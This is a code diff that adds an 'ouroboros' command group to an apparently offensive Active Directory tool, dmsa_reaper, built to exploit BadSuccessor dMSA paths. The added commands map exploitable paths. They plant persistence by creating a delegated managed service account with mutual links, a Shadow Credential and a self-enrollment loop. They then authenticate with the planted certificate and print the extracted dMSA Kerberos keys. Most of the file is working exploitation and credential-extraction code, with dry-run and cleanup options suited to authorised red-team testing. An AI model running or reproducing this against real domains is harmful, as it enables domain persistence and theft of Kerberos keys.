@@ -8,6 +8,7 @@ from typing import Any, Optional
 import typer
 from rich import print
 from rich.panel import Panel
+from rich.table import Table
 
 from dmsa_reaper import __version__
 from dmsa_reaper.auth.ldap_bind import LdapAuthConfig, bind
@@ -27,6 +28,15 @@ from dmsa_reaper.ops.ticket import (
     acquire_dmsa_tgt,
     acquire_dmsa_ticket,
 )
+from dmsa_reaper.ouroboros.checks import (
+    active_ouroboros_findings,
+    classify_ouroboros_paths,
+)
+from dmsa_reaper.ouroboros.credentials import secure_write_json
+from dmsa_reaper.ouroboros.extract import (
+    OuroborosExtractionError,
+    extract_ouroboros_credentials,
+)
 from dmsa_reaper.output.console import print_paths
 from dmsa_reaper.paths.classifier import classify_paths
 from dmsa_reaper.paths.ranking import rank_paths
@@ -39,6 +49,12 @@ app = typer.Typer(
     help="Find and exploit BadSuccessor paths in Active Directory.",
     no_args_is_help=True,
 )
+ouroboros_app = typer.Typer(
+    add_completion=False,
+    help="Assess and exercise dMSA Ouroboros persistence.",
+    no_args_is_help=True,
+)
+app.add_typer(ouroboros_app, name="ouroboros")
 
 _LEGACY_PRIMITIVES = frozenset({"legacy-oneway-link", "existing-dmsa-legacy-link"})
 _CREATE_CHILD_RIGHTS = frozenset({"CreateChild", "CreateChild:dMSA", "GenericAll"})
@@ -164,6 +180,7 @@ def _writes_postpatch_target(
     return primitive_name in {
         "postpatch-mutual-pair",
         "existing-dmsa-postpatch-mutual",
+        "ouroboros",
     } or (primitive_name == "dacl-container-escalate" and chain == "postpatch")
 
 
@@ -1081,6 +1098,433 @@ def cleanup_cmd(
     if json_out:
         _write_json(json_out, payload)
     cleanup = operation.metadata.get("cleanup") or {}
+    for conflict in cleanup.get("conflicts", []):
+        print(f"[red][-] {conflict.get('dn')}: {conflict.get('reason')}[/red]")
+    for error in cleanup.get("errors", []):
+        print(f"[red][-] {error.get('dn')}: {error.get('reason')}[/red]")
+    print(
+        f"[green][+] Cleanup:[/green] {operation.status} "
+        f"(checked={str(operation.cleanup_verified).lower()})"
+    )
+    if not operation.cleanup_verified:
+        raise typer.Exit(code=1)
+
+
+@ouroboros_app.command("check")
+def ouroboros_check_cmd(
+    domain: str = typer.Option(..., "--domain", "-d", help="Target domain FQDN."),
+    dc_ip: Optional[str] = _OPT_DC_IP,
+    dc_host: Optional[str] = _OPT_DC_HOST,
+    username: Optional[str] = _OPT_USER,
+    password: Optional[str] = _OPT_PASS,
+    kerberos: bool = _OPT_KRB,
+    use_ldaps: bool = _OPT_LDAPS,
+    start_tls: bool = _OPT_STARTTLS,
+    target_account: Optional[str] = typer.Option(
+        None,
+        "--target-account",
+        help="Limit capability analysis to one account by SAM, SID, or DN.",
+    ),
+    container_dn: Optional[str] = typer.Option(
+        None,
+        "--container-dn",
+        help="Limit capability analysis to one creation container.",
+    ),
+    json_out: Optional[Path] = typer.Option(None, "--json"),
+) -> None:
+    """Find Ouroboros-capable paths and already planted persistence."""
+    if kerberos and not username:
+        raise typer.BadParameter(
+            "Kerberos checking requires --username for SID and group resolution"
+        )
+    state = run_live_map(
+        _make_ldap_config(
+            domain,
+            dc_ip,
+            dc_host,
+            username,
+            password,
+            kerberos,
+            use_ldaps,
+            start_tls,
+        ),
+        sdflags=DEFAULT_SD_FLAGS,
+        target_filter=(
+            _exact_target_filter(target_account) if target_account else None
+        ),
+    )
+    paths = classify_ouroboros_paths(state)
+    if container_dn:
+        paths = [
+            path
+            for path in paths
+            if (path.container_dn or "").lower() == container_dn.lower()
+        ]
+    findings = active_ouroboros_findings(state)
+
+    capability = state.environment.dmsa_capable_status.value
+    print(
+        Panel(
+            f"dMSA capability: [bold]{capability}[/bold]\n"
+            f"Ouroboros-capable paths: [bold]{len(paths)}[/bold]\n"
+            f"Existing persistence indicators: [bold]{len(findings)}[/bold]",
+            title="Ouroboros assessment",
+            expand=False,
+        )
+    )
+    if paths:
+        print_paths(paths)
+    else:
+        print("[green][+] No Ouroboros-capable delegated path was mapped.[/green]")
+    if findings:
+        table = Table(title="Existing Ouroboros indicators")
+        table.add_column("Status")
+        table.add_column("dMSA")
+        table.add_column("Shadow creds")
+        table.add_column("Self-authorized")
+        table.add_column("Target")
+        for finding in findings:
+            table.add_row(
+                str(finding["status"]),
+                str(finding["sam"] or finding["dn"]),
+                str(finding["key_credential_count"]),
+                str(finding["self_authorized"]).lower(),
+                str(finding["target_dn"] or "-"),
+            )
+        print(table)
+    if json_out:
+        _write_json(
+            json_out,
+            {
+                "environment": state.environment.model_dump(mode="json"),
+                "paths": [path.model_dump(mode="json") for path in paths],
+                "findings": findings,
+            },
+        )
+        print(f"[green][+] Assessment written:[/green] {json_out}")
+
+
+@ouroboros_app.command("exploit")
+def ouroboros_exploit_cmd(
+    target_account: str = typer.Option(
+        ...,
+        "--target-account",
+        help="Service account to supersede: SAM, SID, or DN.",
+    ),
+    domain: str = typer.Option(..., "--domain", "-d", help="Target domain FQDN."),
+    dc_ip: Optional[str] = _OPT_DC_IP,
+    dc_host: Optional[str] = _OPT_DC_HOST,
+    username: Optional[str] = _OPT_USER,
+    password: Optional[str] = _OPT_PASS,
+    kerberos: bool = _OPT_KRB,
+    use_ldaps: bool = _OPT_LDAPS,
+    start_tls: bool = _OPT_STARTTLS,
+    container_dn: Optional[str] = typer.Option(
+        None,
+        "--container-dn",
+        help="Container in which to create the dMSA; also disambiguates paths.",
+    ),
+    path_id: Optional[str] = typer.Option(
+        None,
+        "--path",
+        help="Ouroboros path ID from 'ouroboros check'.",
+    ),
+    dmsa_name: Optional[str] = typer.Option(
+        None,
+        "--dmsa-name",
+        help="CN prefix for the new dMSA.",
+    ),
+    confirm: bool = typer.Option(False, "--confirm", help="Perform LDAP writes."),
+    dry_run: bool = typer.Option(False, "--dry-run", help="Print planned writes."),
+    cleanup_policy: str = typer.Option(
+        "on-failure",
+        "--cleanup-policy",
+        help="Partial-failure cleanup: on-failure or manual.",
+    ),
+    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
+    json_out: Optional[Path] = typer.Option(None, "--json"),
+) -> None:
+    """Create the mutual links, Shadow Credential, and self-enrollment loop."""
+    if confirm == dry_run:
+        raise typer.BadParameter("choose exactly one of --confirm or --dry-run")
+    if cleanup_policy not in {"on-failure", "manual"}:
+        raise typer.BadParameter("--cleanup-policy must be on-failure or manual")
+    if kerberos and not username:
+        raise typer.BadParameter(
+            "Kerberos exploitation requires --username for execution binding"
+        )
+    configure_ops_dir(ops_dir)
+    state = run_live_map(
+        _make_ldap_config(
+            domain,
+            dc_ip,
+            dc_host,
+            username,
+            password,
+            kerberos,
+            use_ldaps,
+            start_tls,
+        ),
+        sdflags=DEFAULT_SD_FLAGS,
+        target_filter=_exact_target_filter(target_account),
+    )
+    if not state.targets:
+        raise typer.BadParameter(f"target not found: {target_account}")
+    candidates = classify_ouroboros_paths(state)
+    if container_dn:
+        candidates = [
+            path
+            for path in candidates
+            if (path.container_dn or "").lower() == container_dn.lower()
+        ]
+    if path_id:
+        candidates = [path for path in candidates if path.id == path_id]
+    if len(candidates) != 1:
+        if candidates:
+            print_paths(candidates)
+        if not candidates:
+            raise typer.BadParameter(
+                f"no Ouroboros-capable path found for {target_account!r}"
+            )
+        raise typer.BadParameter(
+            f"{len(candidates)} Ouroboros paths found; narrow with --path or --container-dn"
+        )
+
+    selected = candidates[0]
+    primitive = get_primitives()["ouroboros"]
+    effective_target = selected.target_dn
+    effective_container = selected.container_dn
+    if not effective_target or not effective_container:
+        raise typer.BadParameter("selected Ouroboros path is missing target or container")
+    writable_attrs = _target_writable_attrs(
+        state,
+        effective_target,
+        primitive.name,
+        None,
+    )
+    try:
+        warnings = [
+            *selected.environment_warnings,
+            *primitive.preflight(
+                selected,
+                target_dn=effective_target,
+                container_dn=effective_container,
+            ),
+        ]
+    except Exception as exc:
+        raise typer.BadParameter(f"preflight failed: {exc}") from exc
+    for warning in dict.fromkeys(warnings):
+        print(f"[yellow][!] {warning}[/yellow]")
+
+    if dry_run:
+        preview = Operation(
+            id="DRY-RUN",
+            primitive="ouroboros",
+            path_id=selected.id,
+            metadata={"path": selected.model_dump(mode="json")},
+        )
+        _populate_operation(
+            preview,
+            state=state,
+            target_dn=effective_target,
+            container_dn=effective_container,
+            chain=None,
+            dmsa_name=dmsa_name,
+            target_writable_attrs=writable_attrs,
+            allow_broad_dacl=False,
+            dc_host=dc_host,
+            dc_ip=dc_ip,
+        )
+        steps = primitive.dry_run_steps(preview)
+        if json_out:
+            _write_json(
+                json_out,
+                {
+                    "operation": preview.model_dump(mode="json"),
+                    "steps": steps,
+                    "ldap_writes_performed": False,
+                },
+            )
+        print(
+            Panel(
+                "\n".join(steps),
+                title="[yellow]dry run[/yellow] Ouroboros",
+                subtitle="No LDAP writes were made",
+                expand=False,
+            )
+        )
+        return
+
+    _require_container_right(
+        state,
+        effective_container,
+        _CREATE_CHILD_RIGHTS,
+        "CreateChild:dMSA",
+    )
+    conn = bind(
+        _make_ldap_config(
+            domain,
+            dc_ip,
+            dc_host,
+            username,
+            password,
+            kerberos,
+            use_ldaps,
+            start_tls,
+        )
+    )
+    execution_identity = _validate_execution_binding(
+        conn=conn,
+        state=state,
+        username=username,
+        kerberos=kerberos,
+        dc_host=dc_host,
+        dc_ip=dc_ip,
+    )
+    validated_guids = _revalidate_mapped_guids(
+        conn=conn,
+        state=state,
+        dns=[effective_container, effective_target],
+    )
+    operation = primitive.plan(selected)
+    _populate_operation(
+        operation,
+        state=state,
+        target_dn=effective_target,
+        container_dn=effective_container,
+        chain=None,
+        dmsa_name=dmsa_name,
+        target_writable_attrs=writable_attrs,
+        allow_broad_dacl=False,
+        dc_host=dc_host,
+        dc_ip=dc_ip,
+    )
+    operation.metadata["runs_dir"] = str(get_ops_dir().parent / "runs")
+    operation.metadata["execution_identity"] = execution_identity
+    operation.metadata["validated_object_guids"] = validated_guids
+    save_operation(operation)
+    print(f"[*] Operation: {operation.id}")
+    try:
+        operation = primitive.execute(operation, confirm=True, conn=conn)
+    except Exception:
+        if cleanup_policy == "on-failure":
+            operation = cleanup_operation(operation, conn=conn)
+            save_operation(operation)
+            print(f"[yellow][!] Automatic cleanup: {operation.status}[/yellow]")
+        raise
+    save_operation(operation)
+    if json_out:
+        _write_json(json_out, operation.model_dump(mode="json"))
+    ouroboros_meta = operation.metadata.get("ouroboros") or {}
+    print(
+        Panel(
+            f"[bold]dMSA[/bold]      {operation.metadata.get('created_dmsa_sam')}\n"
+            f"[bold]Target[/bold]    {effective_target}\n"
+            f"[bold]PFX[/bold]       {ouroboros_meta.get('pfx_path')}\n\n"
+            f"Extract: dmsa-reaper ouroboros extract --op {operation.id}\n"
+            f"Cleanup: dmsa-reaper ouroboros cleanup --op {operation.id}",
+            title="[green]Ouroboros established[/green]",
+            subtitle=f"operation {operation.id}",
+            expand=False,
+        )
+    )
+
+
+@ouroboros_app.command("extract")
+def ouroboros_extract_cmd(
+    op_id: str = typer.Option(..., "--op", help="Active Ouroboros operation ID."),
+    domain: Optional[str] = typer.Option(None, "--domain", "-d"),
+    dc_ip: Optional[str] = typer.Option(None, "--dc-ip", help="KDC IP or hostname."),
+    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
+    json_out: Optional[Path] = typer.Option(None, "--json"),
+) -> None:
+    """Authenticate with the planted certificate and recover the KDC key package."""
+    configure_ops_dir(ops_dir)
+    operation = load_operation(op_id)
+    try:
+        result = extract_ouroboros_credentials(
+            operation,
+            domain=domain,
+            dc=dc_ip,
+        )
+    except OuroborosExtractionError as exc:
+        raise typer.BadParameter(str(exc)) from exc
+    operation.metadata.setdefault("ouroboros_extractions", []).append(
+        {
+            "status": result["status"],
+            "extracted_at": result["extracted_at"],
+            "artifact": result["artifact"],
+            "current_key_count": len(result["current_keys"]),
+            "previous_key_count": len(result["previous_keys"]),
+        }
+    )
+    save_operation(operation)
+    if json_out:
+        secure_write_json(json_out, result)
+    print("[green][+] KERB-DMSA-KEY-PACKAGE extracted[/green]")
+    for key in result["current_keys"]:
+        print(f"[*] dMSA current {key['enctype']}: {key['value']}")
+    for key in result["previous_keys"]:
+        print(f"[*] Previous {key['enctype']}: {key['value']}")
+    print(f"[*] Protected artifact: {result['artifact']}")
+
+
+@ouroboros_app.command("cleanup")
+def ouroboros_cleanup_cmd(
+    op_id: str = typer.Option(..., "--op", help="Ouroboros operation ID."),
+    domain: Optional[str] = typer.Option(None, "--domain", "-d"),
+    dc_ip: Optional[str] = _OPT_DC_IP,
+    dc_host: Optional[str] = _OPT_DC_HOST,
+    username: Optional[str] = _OPT_USER,
+    password: Optional[str] = _OPT_PASS,
+    kerberos: bool = _OPT_KRB,
+    use_ldaps: bool = _OPT_LDAPS,
+    start_tls: bool = _OPT_STARTTLS,
+    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
+    json_out: Optional[Path] = typer.Option(None, "--json"),
+) -> None:
+    """Delete the GUID-matched dMSA and restore target-side values."""
+    configure_ops_dir(ops_dir)
+    operation = load_operation(op_id)
+    if operation.primitive != "ouroboros":
+        raise typer.BadParameter("operation is not an Ouroboros operation")
+    if not (operation.cleaned_up and operation.cleanup_verified):
+        effective_domain = domain or operation.metadata.get("domain") or ""
+        effective_dc_ip = dc_ip or operation.metadata.get("dc_ip")
+        effective_dc_host = dc_host or operation.metadata.get("dc_host")
+        if not effective_domain and not effective_dc_ip and not effective_dc_host:
+            raise typer.BadParameter("--domain, --dc-ip, or --dc-host is required")
+        conn = bind(
+            _make_ldap_config(
+                str(effective_domain),
+                effective_dc_ip,
+                effective_dc_host,
+                username,
+                password,
+                kerberos,
+                use_ldaps,
+                start_tls,
+            )
+        )
+        operation = cleanup_operation(operation, conn=conn)
+        save_operation(operation)
+    cleanup = operation.metadata.get("cleanup") or {}
+    payload = {
+        "operation_id": operation.id,
+        "status": operation.status,
+        "cleanup_verified": operation.cleanup_verified,
+        "ouroboros_persistence_removed": cleanup.get(
+            "ouroboros_persistence_removed", False
+        ),
+        "cleanup": cleanup,
+    }
+    artifact = get_ops_dir().parent / "runs" / operation.id / "ouroboros-cleanup.json"
+    _write_json(artifact, payload)
+    artifact.chmod(0o600)
+    if json_out:
+        _write_json(json_out, payload)
+    if payload["ouroboros_persistence_removed"]:
+        print("[green][+] GUID-matched Ouroboros dMSA removed[/green]")
     for conflict in cleanup.get("conflicts", []):
         print(f"[red][-] {conflict.get('dn')}: {conflict.get('reason')}[/red]")
     for error in cleanup.get("errors", []):
